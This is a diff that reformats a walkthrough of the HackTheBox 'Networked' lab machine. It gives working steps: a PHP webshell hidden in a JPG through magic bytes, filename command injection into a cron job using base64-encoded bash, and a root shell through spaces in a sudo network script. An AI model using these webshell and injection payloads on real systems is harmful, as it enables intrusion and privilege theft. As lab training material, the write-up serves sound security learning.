@@ -3,119 +3,125 @@ layout: default
 title: "Networked"
 date: 19-08-26
 ---
+
 Networked - HackTheBox
-
-OS: Linux
-
-Difficulty: Easy
-
-Pawn Date: 19/08/26
-
+ 
+**OS:** Linux  
+**Difficulty:** Easy  
+**Pawn Date:** 19/08/26  
+ 
 ---
-
-Recognition:
-
- nmap
  
-```nmap -sVC -p- IP```
-
-Ports found:
-22,80
-
-Enumeration:
-
-We find ssh and apache on his normal ports. After going into the webpage
-we see a message saying that they are building the web FaceMash etc, nothing
-too important here. So i used gobuster to find files and folders, after a while
-we find this:
-````
-/index.php 200
-
-/upload.php 200 
-
-/uploads 301
-
-/photos.php 200 
-
-/lib.php 200
-
-/backup 301 
-````
-with /upload.php we can upload files on the server, the /backup contains a tar
-archive that i downloaded and that thing cointains the source code of the PHP 
-files.
-
-After checking everything so well, we now a few things
-When you upload a file they check different things:
-the size, you dont need to pass the limit
-the file, if its not an image they reject the file
-the extension, if its not gif,jpg or png ur file got deleted
-they change the name of the file when u upload the file
-Its vulnerable to double file extension
-
-So knowing all those things lets upload a file!!
-we are gonna upload this command to put a webshell on the server:
-```bash
-<?php system($_GET['cmd']); ?>
+## Recognition
+ 
+### nmap
 ```
-buuuut if we upload this file like this its gonna say its invalid sooo we are gonna
-use the magic bytes first, or in my case put this command on the metadata of a jpg 
-file.
-
-Initial Access:
-
-Vulnerability: Unrestricted File Upload
-
- Vector: webshell as apache
+nmap -sVC -p- IP
+```
+**Ports found:** 22 (SSH), 80 (HTTP)
  
- Escalation 1: apache -> guly via cron injection
+---
  
- Escalation 2: guly -> root via network script
+## Enumeration
  
-Payload:
-
-we create the file with the magic bytes ```` (echo '\xFF\xD8\xFF\xE0' > shell.php.jpg) ````
-and then we put the command for the webshell ```` (echo "<?php system($_GET['cmd']); ?>" >> shell.php.jpg) ````
-
-
-When we where there we see a cron, that basically is not well designed-sanitized and it will execute
-all the file names as commands after the ";" with "guly" user permissions soooooo we are gonna make a
-file with the name that we want to execute with "guly" permissions.
-````curl --data-urlencode 'cmd=touch -- ";echo thecommandthatuwantencoded | base 64 -d | bash' http://10.129.45.196/uploads/10_10_17_100.php.jpg | strings | head ````
-
-Now we have the guly permissions
-
-Escalation of privileges:
-
-From:guly
-
-to: root
-
-Vector: sudo -l 
-
-Method:
-
-After seeing sudo -l i saw a script that we can run as root, the script creates a configuration
-for the guly0 Network Interface and uses "ifup guly0" to activate it at the end. Network configuration
-scripts on CentOS are vulnerable to command injection (i knew it because i did i quick research) leading
-to execution of anything after a space. So at the end to get the root acces i just executed this command:
-````sudo /usr/local/sbin/changename.sh ````
-````
-interface NAME:
-aaa /bin/bash                       #with the space between
-interface PROXY_METHOD:
-aaa
-interface BROWSER_ONLY:
-aaa
-interface BOOTPROTO:
-aaa
-````
-And now we are root, u can check it with "whoami"
-
-Lessons Learned:
-
-- Double extension bypass: servers may check extension but not MIME type properly
-- Cron jobs executing filenames without sanitization = command injection vector
-- Always check sudo -l first when escalating privileges  
-- Network config scripts on CentOS/RHEL are vulnerable to injection via spaces
-- GTFOBins is essential when you find a binary in sudo -l
+Only two open ports — SSH and Apache. The webpage shows a message about building a site called FaceMash, nothing useful there. I ran gobuster to find hidden files and directories:
+ 
+```
+/index.php   200
+/upload.php  200
+/uploads     301
+/photos.php  200
+/lib.php     200
+/backup      301
+```
+ 
+The `/backup` directory contained a `.tar` archive with the PHP source code of the entire application. After reading the source carefully, I understood how the upload validation works:
+ 
+- Checks file size (must be under limit)
+- Checks MIME type (must be an image)
+- Checks extension (only `.gif`, `.jpg`, `.png` allowed)
+- Renames the uploaded file using the client IP address
+The key finding: the server checks extension but **not content properly**, making it vulnerable to a **double extension bypass** combined with magic bytes injection.
+ 
+---
+ 
+## Initial Access
+ 
+**Vulnerability:** Unrestricted File Upload → Remote Code Execution  
+**Vector:** `/upload.php` exposed on the server
+ 
+To bypass the filters, I embedded a PHP webshell inside a valid JPG file using magic bytes:
+ 
+```bash
+echo '\xFF\xD8\xFF\xE0' > shell.php.jpg
+echo "<?php system(\$_GET['cmd']); ?>" >> shell.php.jpg
+```
+ 
+After uploading and accessing the file via `/uploads/`, I had command execution as the `apache` user.
+ 
+---
+ 
+## Privilege Escalation
+ 
+### apache → guly (Cron Injection)
+ 
+After basic enumeration, I found an interesting cron running every 3 minutes as `guly`:
+ 
+```
+*/3 * * * * php /home/guly/check_attack.php
+```
+ 
+Reading `check_attack.php`, I noticed this vulnerable line:
+ 
+```php
+mail($to, $msg, $msg, $headers, "-F$value");
+```
+ 
+The variable `$value` is the **filename** of files in `/var/www/html/uploads/`, and it's passed directly to `mail()` without sanitization. This means if a filename contains `;command;`, the shell will execute that command as `guly` when the cron runs.
+ 
+Since I couldn't use `/` in filenames (kernel restriction), I encoded the command in base64:
+ 
+```bash
+# Command to encode:
+# cat /home/guly/user.txt > /var/www/html/uploads/XDLOL
+ 
+curl -G --data-urlencode 'cmd=touch -- ";echo BASE64HERE | base64 -d | bash;"' \
+  http://IP/uploads/10_10_17_100.php.jpg | strings
+```
+ 
+After waiting 3 minutes for the cron to execute, I had the user flag and confirmed execution as `guly`.
+ 
+To get a proper shell, I added my SSH public key to `guly`'s `authorized_keys` using the same cron injection technique, then connected via SSH.
+ 
+---
+ 
+### guly → root (Network Script Injection)
+ 
+```bash
+sudo -l
+# User guly may run: (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+ 
+The script `changename.sh` creates a network interface configuration and runs `ifup`. On CentOS/RHEL, network configuration scripts are vulnerable to command injection via spaces in the values.
+ 
+```bash
+sudo /usr/local/sbin/changename.sh
+interface NAME: aaa /bin/bash
+interface PROXY_METHOD: aaa
+interface BROWSER_ONLY: aaa
+interface BOOTPROTO: aaa
+```
+ 
+The space in `aaa /bin/bash` caused the system to execute `/bin/bash` as root, giving a root shell.
+ 
+---
+ 
+## Lessons Learned
+ 
+- Double extension bypass works when servers check extension but not MIME type properly
+- Filenames passed to shell commands without sanitization = command injection vector
+- When `/` is not available in filenames, base64 encoding is a reliable bypass
+- Always read source code carefully when it's available — it reveals the exact validation logic
+- Always run `sudo -l` first when escalating privileges
+- Network config scripts on CentOS/RHEL are vulnerable to injection via spaces in values
+- GTFOBins is essential when you find a binary in `sudo -l`
